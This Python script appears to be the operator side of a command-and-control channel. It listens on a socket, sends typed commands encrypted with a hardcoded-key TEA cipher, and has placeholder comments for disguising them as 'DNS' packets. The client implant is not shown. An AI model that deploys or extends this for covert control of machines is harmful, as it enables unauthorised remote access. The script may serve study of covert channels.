import socket, subprocess, os, time, base64, ctypes, itertools, math, sys, codecs

def runServer():
    HOST = "localhost" #"192.168.1.8"
    PORT = 1337 #52
    PKT_SIZE = 1024
    KEY = "zMWYCRLd4szoBiPP"

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(2)

    conn, addr = s.accept() 
    print("New connection made from: " + str(addr))
    while True:
        data = conn.recv(PKT_SIZE).decode()
        if not data:
            # if data is not received break
            break
        #receive client data
        print("client said:" + str(data))

        #get input
        user_input = input('> ')
        safe_input = processInput(user_input)
        if(safe_input == None):
            print("input was too long")
            safe_input = "lenerror" + (' ' * 8)

        #encrypt input
        encrypted_user_input = encrypt(safe_input,KEY)
        
        #create "DNS" packet
        #...
        #...
        packet = encrypted_user_input
        
        #send data
        conn.send(packet.encode())
        #conn.send(data.encode())  # send data to the client

    conn.close()  # close the connection

###
#Helper functions
###
def processInput(uinput):
    len_input = len(uinput)
    if(len_input <= 64):
        return (uinput + ' ' * (64 - len(uinput)))
    elif(len_input <= 128):
        return (uinput + ' ' * (128 - len(uinput)))
    elif(len_input <= 256):
        return (uinput + ' ' * (256 - len(uinput)))
    elif(len_input <= 512):
        return (uinput + ' ' * (512 - len(uinput)))
    else:
        #command was too large
        return None
    return None
    

###
#TEA implementation: https://gist.github.com/twheys/4e83567942172f8ba85058fae6bfeef5
###
def encrypt(plaintext, key):
    if not plaintext:
        return ''

    v = _str2vec(plaintext.encode())
    k = _str2vec(key.encode()[:16])

    bytearray = b''.join(_vec2str(_encipher(chunk, k))
                         for chunk in _chunks(v, 2))

    return base64.b64encode(bytearray).decode()


def decrypt(ciphertext, key):
    if not ciphertext:
        return ''

    k = _str2vec(key.encode()[:16])
    v = _str2vec(base64.b64decode(ciphertext.encode()))

    return b''.join(_vec2str(_decipher(chunk, k))
                    for chunk in _chunks(v, 2)).decode()


def _encipher(v, k):
    y, z = [ctypes.c_uint32(x)
            for x in v]
    sum = ctypes.c_uint32(0)
    delta = 0x9E3779B9
    for n in range(32, 0, -1):
        sum.value += delta
        y.value += (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        z.value += (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]

    return [y.value, z.value]


def _decipher(v, k):
    y, z = [ctypes.c_uint32(x)
            for x in v]
    sum = ctypes.c_uint32(0xC6EF3720)
    delta = 0x9E3779B9
    for n in range(32, 0, -1):
        z.value -= (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]
        y.value -= (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        sum.value -= delta
    return [y.value, z.value]


def _chunks(iterable, n):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk


def _str2vec(value, l=4):
    n = len(value)
    num_chunks = math.ceil(n / l)
    chunks = [value[l * i:l * (i + 1)]
              for i in range(num_chunks)]

    return [sum([character << 8 * j
                 for j, character in enumerate(chunk)])
            for chunk in chunks]


def _vec2str(vector, l=4):
    return bytes((element >> 8 * i) & 0xff
                 for element in vector
                 for i in range(l)).replace(b'\x00', b'')

if __name__ == '__main__':
    runServer()